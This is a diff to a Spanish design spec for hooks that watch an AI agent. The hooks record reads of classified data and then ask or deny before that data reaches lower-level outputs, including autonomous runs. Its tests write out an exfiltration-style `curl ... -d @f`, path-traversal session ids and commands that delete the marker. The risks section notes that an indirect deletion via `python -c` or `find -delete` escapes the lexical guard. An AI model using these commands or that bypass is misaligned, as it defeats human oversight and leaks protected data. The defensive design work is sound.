@@ -51,9 +51,9 @@ adónde va después lo que ya se leyó. Medido sobre `main` (0dd2ea30b):
 
 | Slice | Entrega |
 |---|---|
-| S1 | Marca de sesión: cuando el guard de cúpulas permite (o la persona aprueba) una lectura de cúpula N2+, registra `{cúpula, nivel}` en un fichero de sesión (`~/.savia/dome-read/<session_id>`, 0600; se purga a los 7 días), en el mismo núcleo para bash y TypeScript. |
+| S1 | Marca de sesión: cuando el guard de cúpulas permite (o la persona aprueba) una lectura de cúpula N2+, registra `{cúpula, nivel}` en un fichero de sesión (`~/.savia/dome-read/<session_id>`, 0600; se purga a los 7 días), en el mismo núcleo para bash y TypeScript. El hook (PreToolUse) no sabe si la persona aprobó un «ask»: **marca al emitir el permitir o el «ask» de la lectura**, es decir, de forma conservadora (una lectura preguntada y denegada también deja marca). `session_id` se valida con la lista `^[A-Za-z0-9_-]{1,128}$` antes de construir la ruta; cualquier otro valor (`../`, separadores, vacío) se rechaza sin tocar el disco y la llamada recibe «ask». |
 | S2 | Lista de salidas de menor nivel con su nivel máximo admitido: repositorio público y sus PRs y comentarios (N1), red general (N1), mensajería saliente (N1), cúpula de nivel inferior (su nivel). Versionada en `docs/rules/domain/relay-sinks.md`. |
-| S3 | Regla en PreToolUse: si la sesión tiene marca de nivel mayor que el admitido por la salida, la llamada recibe «preguntar» con motivo en formato de tarjeta (SE-459): qué cúpula se leyó, adónde va, que no es reversible. Sin marca, nada cambia. |
+| S3 | Regla en PreToolUse: si la sesión tiene marca de nivel mayor que el admitido por la salida, la llamada recibe «preguntar» con motivo en formato de tarjeta (SE-459): qué cúpula se leyó, adónde va, que no es reversible. Sin marca, nada cambia. En ejecución autónoma (`SAVIA_AUTONOMOUS_RUN=1` o rama `agent/*`) nadie contesta al «ask» y un diálogo sin respuesta detiene al worker horas (SE-459), así que la misma condición se resuelve como **denegar** con el mismo motivo; el worker deja el trabajo en su rama y lo declara en la marca de fin. |
 | S4 | Paridad bash/TypeScript y pruebas negativas por cada tipo de salida. |
 
 ## Fuera de alcance
@@ -73,7 +73,9 @@ adónde va después lo que ya se leyó. Medido sobre `main` (0dd2ea30b):
 | AC4 | Negativo: con marca N2, una orden de red (`curl https://example.invalid -d @f`) recibe «ask». |
 | AC5 | Paridad: el hook bash y la regla de `savia-gates` dan la misma decisión y motivo para AC2 a AC4 con la misma entrada. |
 | AC6 | La marca no sobrevive a la sesión: otra `session_id` no la ve (test con dos ids). |
-| AC7 | Negativo: con marca N2, `rm ~/.savia/dome-read/<session_id>` recibe «ask» o «deny» del guard; con el directorio ilegible (permisos 000) la salida a N1 recibe «ask»; con el directorio inexistente, nada. |
+| AC7 | Negativo: con marca N2, `rm ~/.savia/dome-read/<session_id>`, `rm -r ~/.savia/dome-read` y `mv ~/.savia/dome-read <otro>` reciben «ask» o «deny» del guard. «Ilegible» se prueba sin depender de permisos (los tests pueden correr como root): el fixture sustituye el directorio por un fichero regular, y la salida a N1 recibe «ask»; con el directorio inexistente, nada. |
+| AC8 | Negativo de ruta: un `session_id` `../../x`, con `/`, vacío o de más de 128 caracteres no crea ni lee ningún fichero fuera de `dome-read/` (el árbol de ficheros del fixture no cambia) y la llamada recibe «ask». |
+| AC9 | En ejecución autónoma (variable y, por separado, rama `agent/*`), la salida de AC2 recibe «deny», no «ask»; en sesión interactiva sigue siendo «ask». |
 
 ## Riesgos
 
@@ -84,7 +86,7 @@ adónde va después lo que ya se leyó. Medido sobre `main` (0dd2ea30b):
   bajo `~/.savia/` (no en `/tmp`, que se limpia); `~/.savia/dome-read/` entra en las rutas protegidas
   de los guards de escritura y de Bash (como el directorio de latidos de SE-463), de modo que un
   `rm` de la marca recibe «ask» o «deny». Si el directorio existe pero no se puede leer, la regla
-  trata la sesión como marcada N2 (pregunta). Si el directorio **aún no existe** (primera sesión sin
+  trata la sesión como marcada N2 (pregunta). La protección es léxica, como la del resto de guards de Bash: un `rm` indirecto (`python -c`, `find -delete`) puede escaparse; es un límite declarado, y la frontera fuerte sigue siendo el sandbox (SE-434). Si el directorio **aún no existe** (primera sesión sin
   lecturas de cúpula), es una sesión limpia: ilegible y ausente se distinguen.
 
 ## Decisiones de la operadora
